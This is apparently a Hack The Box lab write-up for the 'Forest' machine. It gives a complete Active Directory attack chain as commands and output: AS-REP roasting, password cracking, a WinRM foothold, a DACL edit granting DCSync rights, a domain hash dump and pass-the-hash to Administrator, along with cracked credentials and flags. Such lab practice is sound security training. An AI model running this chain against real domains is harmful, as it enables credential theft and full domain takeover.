# 📄 HTB: [Machine Name: Forest]

## Challenge Details

Category: [[CyberSecurity]], [[Active Directory]], [[Kerberoasting]], [[DCSync]], [[Privilege Escalation]]

Difficulty: Medium/Hard

Target: Forest (IP: $target or 10.129.252.47)

Status: #solved

Date Completed: [[2025-11-23]]

Initial Credentials: N/A (Initial access gained via AS-REPRoast on svc-alfresco)

---

## 1. Initial Access & User Flag 🔑

Initial access was gained by enumerating domain users and exploiting a misconfigured account for **AS-REPRoasting**.

|**Detail**|**Value**|
|---|---|
|**Initial User Compromised**|`svc-alfresco`|
|**Initial Password**|`s3rvice`|
|**Domain**|`htb.local`|
|**User Flag**|`6b3ee6986cf816d22af627b4acc31bdc`|

### Nmap and Host Discovery 🔎

Bash

```
# Full and service scan combined
nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v -oN nmap_sVsC.txt && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN nmap_vuln.txt
```

#### Key Open Ports

|**PORT**|**SERVICE**|**VERSION**|**NOTES**|
|---|---|---|---|
|**88/tcp**|kerberos-sec|Microsoft Windows Kerberos|Active Directory KDC|
|389/tcp|ldap|MS Windows Active Directory LDAP|Domain: **htb.local**|
|445/tcp|microsoft-ds|Windows Server 2016|SMB|
|**5985/tcp**|http|Microsoft HTTPAPI httpd 2.0|**WinRM** (Entry point)|

### User Enumeration and AS-REPRoast 🎣

The AD domain name was identified as **`htb.local`** and user accounts were enumerated via LDAP on port 389.

Bash

```
# User Enumeration via LDAP (nxc equivalent)
netexec ldap $target -u '' -p '' --users | awk '{print$5}' |fgrep -v '[*]' | tee users2
# Harvested Users Snippet: sebastien, lucinda, svc-alfresco, andy, mark, santi

# Extract AS-REPRoast Hash (accounts without 'Do not require Kerberos preauthentication')
impacket-GetNPUsers htb.local/ -dc-ip $target -usersfile users2 -outputfile hashes.txt
# Key Output: $krb5asrep$23$svc-alfresco@HTB.LOCAL:... (Hash saved)

# Crack Hash with John
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
# Key Output: s3rvice           ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
```

### Foothold (User Shell) 🚪

Bash

```
# Verify credentials with NetExec (etexec)
netexec winrm $target -u svc-alfresco -p s3rvice
# Key Output: [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)

# Establish WinRM shell
evil-winrm -i $target -u svc-alfresco -p s3rvice

# Retrieve User Flag
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> type user.txt
# Output: 6b3ee6986cf816d22af627b4acc31bdc
```

---

## 2. Privilege Escalation 👑

The path to compromise involved an Active Directory misconfiguration (**Exchange Windows Permissions** group membership via **Bloodhound** analysis) that allowed the compromised service account to grant itself **DCSync** rights.

### DACL Modification (DCSync Rights)

The `svc-alfresco` user was either implicitly a member of a high-privilege group (like "Exchange Windows Permissions") or the group had rights to modify the domain object's DACL.

Bash

```
# Optional: Check group membership (shows Exchange Trusted Subsystem)
net rpc group members "Exchange Windows Permissions" -U "htb.local"/"svc-alfresco"%"s3rvice" -S $target

# Grant DCSync right to svc-alfresco on the Domain Object
impacket-dacledit -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' 'htb.local'/'svc-alfresco':'s3rvice'
# Key Output: [*] DACL modified successfully!
```

### Domain Takeover (DCSync)

With DCSync rights, the NTLM hashes for all domain users, including the Domain Administrator, were dumped.

Bash

```
# Execute DCSync to dump NTDS.DIT secrets
impacket-secretsdump -just-dc-ntlm htb.local/svc-alfresco:'s3rvice'@$target
# Key Output Snippet (Administrator NT Hash):
# htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

### Root Access (Pass-The-Hash)

The Administrator's NTLM hash was used to authenticate via **Pass-The-Hash** to gain an Administrator WinRM shell.

Bash

```
# Pass-The-Hash to gain an Administrator shell
evil-winrm -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -i $target
# Key Output: Info: Establishing connection to remote endpoint

# Retrieve Root Flag
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
# Output: 3e2bcfd0c00d1f07951fdf3eacb71822
```
